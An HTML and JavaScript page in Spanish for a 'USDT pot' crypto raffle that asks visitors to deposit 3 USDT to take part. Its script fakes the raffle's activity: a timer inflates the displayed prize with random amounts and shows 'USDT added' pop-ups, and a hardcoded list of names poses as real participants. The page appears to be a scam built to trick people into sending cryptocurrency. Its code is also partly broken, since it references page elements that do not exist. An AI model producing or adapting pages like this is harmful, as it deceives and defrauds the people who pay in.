<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bote de USDT</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #181818;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            text-align: center;
        }

        .circle {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: #292b2f;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }

        .amount {
            font-size: 30px;
            font-weight: bold;
        }

        .buttons {
            display: flex;
            justify-content: space-evenly;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 10px;
        }

        button:hover {
            background-color: #45a049;
        }

        #notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 128, 0, 0.8);
            color: #fff;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .notification.show {
            display: block;
            opacity: 1;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            margin: 10px 0;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="circle">
            <p class="amount" id="prize-amount">$93.00</p>
        </div>
        <div class="buttons">
            <button id="participate-btn">Participar</button>
            <button id="participants-btn">Ver Lista de Participantes</button>
            <button id="rules-btn">Reglas del Sorteo</button>
        </div>
    </div>
    <div id="notification" class="notification"></div> <!-- Contenedor de la notificación flotante -->

    <script>
        let participants = [
            "Juan Pérez", "Ana González", "Carlos Rodríguez", "Luis Martínez", "Marta Fernández",
            "Pedro López", "José García", "Isabel Martínez", "Raúl Sánchez", "Lucía Hernández",
            "David Ramírez", "Elena Díaz"
        ];

        const validCodes = [
            "1234", "5678", "9101", "1121", "3141", "5161", "7181", "9202", "2223", "3243",
            "4263", "5283", "6303", "7323", "8343"
        ];

        let prizeAmount = 93;

        function showNotification(amountAdded) {
            const notification = document.getElementById("notification");
            notification.innerText = `¡Se ha agregado ${amountAdded} USDT al premio!`;
            notification.classList.add("show");
            setTimeout(() => {
                notification.classList.remove("show");
            }, 2000);
        }

        function updatePrizeAmount() {
            const prizeElement = document.getElementById("prize-amount");
            const increments = [3, 6, 9, 3, 2, 1, 5, 8];

            setInterval(() => {
                const randomIncrement = increments[Math.floor(Math.random() * increments.length)];
                prizeAmount += randomIncrement;
                prizeElement.innerText = `$${prizeAmount.toFixed(2)}`;
                showNotification(randomIncrement);
            }, Math.floor(Math.random() * (300000 - 10000 + 1)) + 10000);
        }

        function loadParticipants() {
            const listElement = document.getElementById("participants-list");
            participants.forEach(participant => {
                const li = document.createElement("li");
                li.innerText = participant;
                listElement.appendChild(li);
            });
        }

        function addParticipant(name) {
            participants.push(name);
            localStorage.setItem('participants', JSON.stringify(participants));
        }

        function validateActivationCode(inputCode) {
            const index = validCodes.indexOf(inputCode);
            if (index !== -1) {
                validCodes.splice(index, 1);
                return true;
            }
            return false;
        }

        document.getElementById("participate-btn").addEventListener("click", function() {
            alert("Para participar, realiza un depósito de 3 USDT.");
            window.location.href = 'confirmation.html';
        });

        document.getElementById("participants-btn").addEventListener("click", function() {
            window.location.href = 'participants.html';
        });

        document.getElementById("rules-btn").addEventListener("click", function() {
            window.location.href = 'rules.html';
        });

        document.getElementById("validate-hash-btn").addEventListener("click", function() {
            const hash = document.getElementById("transaction-hash").value;
            if (hash) {
                localStorage.setItem('transactionHash', hash);
                document.getElementById('hash-container').style.display = 'none';
                document.getElementById('code-container').style.display = 'block';
            } else {
                alert('Por favor ingresa un hash de transacción válido.');
            }
        });

        document.getElementById("confirm-btn").addEventListener("click", function() {
            const code = document.getElementById("activation-code").value;
            if (code && code.length === 4) {
                if (validateActivationCode(code)) {
                    localStorage.setItem('activationCode', code);
                    alert('¡Participación confirmada! Gracias por participar.');
                    sendConfirmationEmail();
                    localStorage.removeItem('participating');
                    window.location.href = 'index.html';
                } else {
                    alert('Código de activación incorrecto o ya ha sido usado. Inténtalo de nuevo.');
                }
            } else {
                alert('Por favor ingresa un código de 4 dígitos válido.');
            }
        });

        function sendConfirmationEmail() {
            const message = `Estimado usuario,\n\nGracias por participar en el bote de USDT. Tu participación ha sido confirmada. Aquí están los detalles de tu participación:\n\nHash de transacción: ${localStorage.getItem('transactionHash')}\nCódigo de activación: ${localStorage.getItem('activationCode')}\n\n¡Buena suerte!`;

            const mailtoLink = `mailto:criptochangep2p@gmail.com?subject=Confirmación de Participación&body=${encodeURIComponent(message)}`;
            window.location.href = mailtoLink;
        }

        updatePrizeAmount();
    </script>
</body>
</html>
